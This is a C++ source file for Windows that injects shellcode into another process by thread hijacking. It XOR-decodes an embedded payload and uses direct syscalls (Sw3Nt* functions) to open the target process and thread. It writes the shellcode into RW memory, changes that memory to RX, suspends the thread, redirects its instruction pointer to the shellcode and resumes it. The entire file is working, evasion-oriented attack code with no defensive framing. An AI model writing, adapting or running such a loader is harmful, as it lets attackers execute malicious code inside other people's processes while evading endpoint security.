#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include "syscalls.h"
#include "payload.h"

typedef NTSTATUS(NTAPI* pNtXxx)();

DWORD FindThreadInProcess(DWORD pid) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	DWORD tid = 0;

	if (Thread32First(hSnap, &te)) {
		do {
			if (te.th32OwnerProcessID == pid) {
				tid = te.th32ThreadID;
				break;
			}
			te.dwSize = sizeof(THREADENTRY32);
		} while (Thread32Next(hSnap, &te));
	}

	CloseHandle(hSnap);
	return tid;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	DWORD pid = (DWORD)atoi(argv[1]);

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	PVOID rBuffer = NULL;
	SIZE_T regionSize = payload_size;
	SIZE_T bytesWritten = 0;
	ULONG oldProtect = 0;
	ULONG suspendCount = 0;

	unsigned char* buf = (unsigned char*)malloc(payload_size);
	if (!buf) return 1;
	memcpy(buf, payload, payload_size);
	for (size_t i = 0; i < payload_size; i++) buf[i] ^= payload_key;

	CLIENT_ID cid = { 0 };
	cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	NTSTATUS status = Sw3NtOpenProcess(
		&hProcess,
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
		&oa,
		&cid);

	if (status != 0 || hProcess == NULL) {
		printf("[-] NtOpenProcess failed: 0x%08lX\n", status);
		free(buf);
		return 1;
	}
	printf("[+] Handle to PID %lu: %p\n", pid, hProcess);

	DWORD tid = FindThreadInProcess(pid);
	if (tid == 0) {
		printf("[-] No thread found in target process\n");
		Sw3NtClose(hProcess);
		free(buf);
		return 1;
	}
	printf("[+] Target thread TID: %lu\n", tid);

	cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

	status = Sw3NtOpenThread(
		&hThread,
		THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
		&oa,
		&cid);

	if (status != 0 || hThread == NULL) {
		printf("[-] NtOpenThread failed: 0x%08lX\n", status);
		Sw3NtClose(hProcess);
		free(buf);
		return 1;
	}
	printf("[+] Thread handle: %p\n", hThread);

	status = Sw3NtAllocateVirtualMemory(
		hProcess,
		&rBuffer,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (status != 0 || rBuffer == NULL) {
		printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		free(buf);
		return 1;
	}
	printf("[+] Allocated %zu bytes at %p (RW)\n", payload_size, rBuffer);

	status = Sw3NtWriteVirtualMemory(
		hProcess,
		rBuffer,
		buf,
		payload_size,
		&bytesWritten);

	SecureZeroMemory(buf, payload_size);
	free(buf);

	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Wrote %zu bytes\n", bytesWritten);

	status = Sw3NtProtectVirtualMemory(
		hProcess,
		&rBuffer,
		&regionSize,
		PAGE_EXECUTE_READ,
		&oldProtect);

	if (status != 0) {
		printf("[-] NtProtectVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Memory protection changed to RX\n");

	status = Sw3NtSuspendThread(hThread, &suspendCount);
	if (status != 0) {
		printf("[-] NtSuspendThread failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Thread suspended (previous count: %lu)\n", suspendCount);

	CONTEXT ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;

	status = Sw3NtGetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtGetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Original RIP: 0x%p\n", (PVOID)ctx.Rip);

	ctx.Rip = (DWORD64)rBuffer;

	status = Sw3NtSetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtSetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] RIP redirected to 0x%p\n", rBuffer);

	status = Sw3NtResumeThread(hThread, NULL);
	if (status != 0) {
		printf("[-] NtResumeThread failed: 0x%08lX\n", status);
	}

	printf("[+] Thread resumed. Shellcode executing.\n");

	Sw3NtClose(hThread);
	Sw3NtClose(hProcess);

	return 0;
}